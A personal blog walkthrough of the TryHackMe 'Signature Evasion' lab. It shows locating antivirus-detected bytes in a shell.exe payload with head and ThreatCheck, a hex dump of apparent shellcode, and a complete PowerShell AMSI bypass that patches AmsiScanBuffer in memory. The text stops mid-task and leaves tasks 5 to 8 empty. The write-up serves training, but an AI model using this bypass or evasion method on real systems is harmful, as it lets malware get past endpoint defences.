---
title: Signature Evasion
author: CYB3RM3
name: CYB3RM3 | Signature Evasion
date: 2022-10-15 15:42:57 +0100
categories: [TryHackMe, RedTeam]
tags: [Malware, Evasion, SOC, RedTeam]
---

Learn how to break signatures and evade common AV, using modern tool-agnostic approaches.

THM Room [https://tryhackme.com/room/signatureevasion](https://tryhackme.com/room/signatureevasion)


## TASK 1 : Introduction
### Read the above and continue to the next task. 
No Answer

## TASK 2 : Signature Identification
### Using the knowledge gained throughout this task, split the binary found in C:\Users\Student\Desktop\Binaries\shell.exe using a native utility discussed in this task. Recursively determine if the split binary is detected until you have obtained the nearest kilobyte of the first signature. 
Using the head function to split hte binary :

```console
root@ip-10-10-87-219:~/Desktop# head --bytes 49425 shell.exe > head.exe
root@ip-10-10-87-219:~/Desktop# ls -la
total 484
drwxr-xr-x  3 root root   4096 Oct 14 13:38  .
drwxr-xr-x 41 root root   4096 Oct 14 13:12  ..
lrwxrwxrwx  1 root root   5 Sep 10  2020 'Additional Tools' -> /opt/
-rw-r--r--  1 root root  49425 Oct 14 14:21  head.exe
-rwxr-xr-x  1 root root   173 Aug 15  2020  mozo-made-15.desktop
-rw-r--r--  1 root root  98851 Oct 14 13:10  shell.exe
drwxr-xr-x 11 root root   4096 Dec 22  2021  Tools
```
{: .nolineno }

Then Uploading head.exe on the windows machine and executing a scan didn't find anything suspicious.

![Threat Scan](/images/thm/signatureevasion/signatureevasion_1.png)
_Threat Scan_

The bad bytes must be after 49425. Wwe need to repeat this process until find the right bytes and until defender will spot a suspicious activity with the file.

No Answer

### To the nearest kibibyte, what is the first detected byte?

As the bad bytes begin at 50500, the nearest kibibyte should be something around 49316 but this answer didn't worked. But the nearest kilobyte is 51000 and seems to be the requested answer. 

Kikibyte <https://en.wikipedia.org/wiki/Byte#Multiple-byte_units> :

 "A system of units based on powers of 2 in which 1 kibibyte (KiB) is equal to 1,024 (i.e., 210) bytes is defined by international standard IEC 80000-13 and is supported by national and international standards bodies (BIPM, IEC, NIST). The IEC standard defines eight such multiples, up to 1 yobibyte (YiB), equal to 10248 bytes"

Answer : 51000

## TASK 3 : Automating Signature Identification
###  Using the knowledge gained throughout this task, identify bad bytes found in C:\Users\Student\Desktop\Binaries\shell.exe using ThreatCheck and the Defender engine. ThreatCheck may take up to 15 minutes to find the offset, in this case you can leave it running in the background, continue with the next task, and come back when it finishes. 

No Answer.

### At what offset was the end of bad bytes for the file?

We can use, as suggested, ThreatCheck.exe which iterates automatically trought the splitting of the binary at the search of bad bytes. The run of this tools can takes some time (In my case, it takes approximately 11 min 30 sec)

```powershell
PS C:\Users\Student\Desktop\Tools> .\ThreatCheck.exe -f "C:\Users\Student\Desktop\Binaries\shell.exe" -e AMSI
[+] Target file size: 73802 bytes
[+] Analyzing...
[*] Testing 36901 bytes
[*] No threat found, increasing size
[*] Testing 55351 bytes
[*] Threat found, splitting
[*] Testing 46126 bytes
[*] No threat found, increasing size
[*] Testing 59964 bytes
[*] Threat found, splitting
[*] Testing 53045 bytes
[*] Threat found, splitting
[*] Testing 49585 bytes
[*] No threat found, increasing size
[*] Testing 61693 bytes
[*] Threat found, splitting
[*] Testing 55639 bytes
[*] Threat found, splitting
[*] Testing 52612 bytes
[*] Threat found, splitting
[*] Testing 51098 bytes
[*] Threat found, splitting
[*] Testing 50341 bytes
[*] No threat found, increasing size
[*] Testing 62071 bytes
[*] Threat found, splitting
[*] Testing 56206 bytes
[*] Threat found, splitting
[*] Testing 53273 bytes
[*] Threat found, splitting
[*] Testing 51807 bytes
[*] Threat found, splitting
[...]
10 minutes later
[...]
[*] Testing 50509 bytes
[*] Threat found, splitting
[*] Testing 50503 bytes
[*] Threat found, splitting
[*] Testing 50500 bytes
[*] Threat found, splitting
[!] Identified end of bad bytes at offset 0xC544
00000000   95 CE 77 FF D5 90 E9 09  00 00 00 3C 7E 5F 66 24   ?IwÿO?é····<~_f$
00000010   8C 09 80 09 31 C0 E9 09  00 00 00 14 4A C5 E1 9B   ?·?·1Aé·····JÅá?
00000020   26 A5 81 BE 64 FF 30 90  64 89 20 90 E9 09 00 00   &¥?_dÿ0?d? ?é···
00000030   00 EF 4F E2 4F 7A FE 36  F1 04 FF D3 90 E9 24 FF   ·ïOâOz_6ñ·ÿO?é$ÿ
00000040   FF FF E8 E4 FE FF FF FC  E8 8F 00 00 00 60 31 D2   ÿÿèä_ÿÿüè?···`1O
00000050   89 E5 64 8B 52 30 8B 52  0C 8B 52 14 8B 72 28 0F   ?åd?R0?R·?R·?r(·
00000060   B7 4A 26 31 FF 31 C0 AC  3C 61 7C 02 2C 20 C1 CF   ·J&1ÿ1A¬<a|·, AI
00000070   0D 01 C7 49 75 EF 52 8B  52 10 57 8B 42 3C 01 D0   ··ÇIuïR?R·W?B<·D
00000080   8B 40 78 85 C0 74 4C 01  D0 8B 58 20 01 D3 50 8B   ?@x?AtL·D?X ·OP?
00000090   48 18 85 C9 74 3C 49 8B  34 8B 01 D6 31 FF 31 C0   H·?Ét<I?4?·Ö1ÿ1A
000000A0   AC C1 CF 0D 01 C7 38 E0  75 F4 03 7D F8 3B 7D 24   ¬AI··Ç8àuô·}o;}$
000000B0   75 E0 58 8B 58 24 01 D3  66 8B 0C 4B 8B 58 1C 01   uàX?X$·Of?·K?X··
000000C0   D3 8B 04 8B 01 D0 89 44  24 24 5B 5B 61 59 5A 51   O?·?·D?D$$[[aYZQ
000000D0   FF E0 58 5F 5A 8B 12 E9  80 FF FF FF 5D 68 33 32   ÿàX_Z?·é?ÿÿÿ]h32
000000E0   00 00 68 77 73 32 5F 54  68 4C 77 26 07 FF D5 B8   ··hws2_ThLw&·ÿO,
000000F0   90 01 00 00 29 C4 54 50  68 29 80 6B 00 FF D5 6A   ?···)ÄTPh)?k·ÿOj

[*] Run time: 695.64s
```
{: .nolineno }

Answer : 0xC544

## TASK 4 : Static Code-Based Signatures
### What flag is found after uploading a properly obfuscated snippet?
We need to obfuscate the following powershell code snippet :

```powershell
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer"
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $A);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```
{: .nolineno }

We can use the tool amsitrigger.exe to find if our powershell script is detect as malicious or not. When applying this tool on the base script, we got a stop on $A = "AmsiScanBuffer" :

```powershell
PS C:\Users\Student\Desktop\Tools> .\amsitrigger.exe
     _    __  __ ____ ___ _____     _
    / \  |  \/  / ___|_ _|_   _| __(_) __ _  __ _  ___ _ __
   / _ \ | |\/| \___ \| |  | || '__| |/ _` |/ _` |/ _ \ '__|
  / ___ \| |  | |___) | |  | || |  | | (_| | (_| |  __/ |
 /_/   \_\_|  |_|____/___| |_||_|  |_|\__, |\__, |\___|_|
                                      |___/ |___/         v3
@_RythmStick



Show triggers in Powershell file or URL.
Usage:
  -i, --inputfile=VALUE      Powershell filename or
  -u, --url=VALUE            URL eg. https://10.1.1.1/Invoke-NinjaCopy.ps1
  -f, --format=VALUE         Output Format:
                               1 - Only show Triggers
                               2 - Show Triggers with line numbers
                               3 - Show Triggers inline with code
                               4 - Show AMSI calls (xmas tree mode)
  -d, --debug                Show debug info
  -m, --maxsiglength=VALUE   Maximum Signature Length to cater for,
                               default=2048
  -c, --chunksize=VALUE      Chunk size to send to AMSIScanBuffer,
                               default=4096
  -h, -?, --help             Show Help
PS C:\Users\Student\Desktop\Tools> .\amsitrigger.exe -i ..\snip.ps1 -f 3
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$A = "AmsiScanBuffer
```
{: .nolineno }

So we can fix it by applying what seen in previous room (Obfuscation principles <https://www.cyb3rm3.com/0bfu5cat10npr1nc1pl35>) like by splitting up the string.

After this, we can run again amsitrigger.exe and he'll stop on the line :





## TASK 5 : Static Property-Based Signatures
## TASK 6 : Behavioral Signatures
## TASK 7 : Putting It All Together
## TASK 8 : Conclusion 

```console

```
{: .nolineno }